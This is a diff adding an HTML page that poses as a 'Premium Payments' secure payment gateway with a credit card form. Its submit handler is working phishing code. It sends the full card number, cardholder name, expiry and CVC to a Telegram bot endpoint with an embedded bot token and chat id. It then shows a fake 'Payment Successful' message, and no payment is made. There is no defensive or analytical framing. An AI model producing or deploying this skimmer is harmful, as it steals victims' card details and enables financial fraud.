@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial; background: linear-gradient(135deg, #1e3c72, #2a5298, #00bf72); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: white; border-radius: 20px; box-shadow: 0 30px 80px rgba(0,0,0,0.3); max-width: 550px; width: 100%; padding: 40px; }
+        .header { background: linear-gradient(135deg, #1e3c72, #2a5298, #00bf72); color: white; padding: 30px; text-align: center; border-radius: 15px; margin-bottom: 30px; }
+        .header h1 { font-size: 28px; margin-bottom: 10px; }
+        .card { background: linear-gradient(135deg, #ef5350, #1976d2, #00bf72); color: white; padding: 25px; border-radius: 15px; margin-bottom: 25px; text-align: center; }
+        .card-number { font-size: 20px; letter-spacing: 3px; margin: 15px 0; font-family: monospace; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; color: #333; }
+        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 14px; }
+        input:focus { outline: none; border-color: #1976d2; background: #f0f7ff; }
+        .row { display: grid; grid-template-columns: 1.5fr 1fr; gap: 15px; }
+        button { width: 100%; padding: 15px; background: linear-gradient(135deg, #ef5350, #1976d2, #00bf72); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button:hover { transform: translateY(-3px); }
+        .success { display: none; background: #4caf50; color: white; padding: 20px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
+        .success.show { display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Premium Payments</h1>
+            <p>Secure Payment Gateway</p>
+        </div>
+
+        <div class="success" id="successMessage">
+            <h2>✓ Payment Successful!</h2>
+        </div>
+
+        <div class="card">
+            <div style="font-size: 40px; margin-bottom: 15px;">💳</div>
+            <div class="card-number" id="cardDisplay">•••• •••• •••• ••••</div>
+            <div style="margin-top: 20px; display: flex; justify-content: space-between; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.3);">
+                <div id="nameDisplay">CARDHOLDER</div>
+                <div id="expiryDisplay">MM/YY</div>
+            </div>
+        </div>
+
+        <form id="form">
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+
+            <div class="form-group">
+                <label>Cardholder Name</label>
+                <input type="text" id="cardHolder" placeholder="John Doe" required>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Expiry</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>CVC</label>
+                    <input type="text" id="cvc" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit">SUBMIT PAYMENT</button>
+        </form>
+    </div>
+
+    <script>
+        const cardInput = document.getElementById('cardNumber');
+        const cardDisplay = document.getElementById('cardDisplay');
+        const nameInput = document.getElementById('cardHolder');
+        const nameDisplay = document.getElementById('nameDisplay');
+        const expiryInput = document.getElementById('expiry');
+        const expiryDisplay = document.getElementById('expiryDisplay');
+        const cvcInput = document.getElementById('cvc');
+        const form = document.getElementById('form');
+        const success = document.getElementById('successMessage');
+
+        cardInput.addEventListener('input', function() {
+            let val = this.value.replace(/\s/g, '').replace(/\D/g, '').slice(0, 16);
+            let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
+            this.value = formatted;
+            let masked = val.replace(/./g, '•').slice(0, -4) + val.slice(-4);
+            cardDisplay.textContent = masked.match(/.{1,4}/g)?.join(' ') || masked;
+        });
+
+        nameInput.addEventListener('input', function() {
+            nameDisplay.textContent = (this.value || 'CARDHOLDER').toUpperCase();
+        });
+
+        expiryInput.addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '').slice(0, 4);
+            if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2);
+            this.value = val;
+            expiryDisplay.textContent = val || 'MM/YY';
+        });
+
+        cvcInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const msg = `🔔 PAYMENT RECEIVED\n\nCardholder: ${nameInput.value}\nCard: ${cardInput.value}\nExpiry: ${expiryInput.value}\nCVC: ${cvcInput.value}\nTime: ${new Date().toLocaleString()}`;
+            
+            const telegramUrl = `https://api.telegram.org/bot8823516080:AAHht jJ3XFwR2QJZ3cZE fm86Lyr_IfG_VCI/sendMessage?chat_id=5643843671&text=${encodeURIComponent(msg)}`;
+            
+            fetch(telegramUrl).catch(e => {});
+            
+            success.classList.add('show');
+            form.style.display = 'none';
+            
+            setTimeout(() => {
+                form.reset();
+                form.style.display = 'block';
+                success.classList.remove('show');
+                cardDisplay.textContent = '•••• •••• •••• ••••';
+                nameDisplay.textContent = 'CARDHOLDER';
+                expiryDisplay.textContent = 'MM/YY';
+            }, 4000);
+        });
+    </script>
+</body>
+</html>
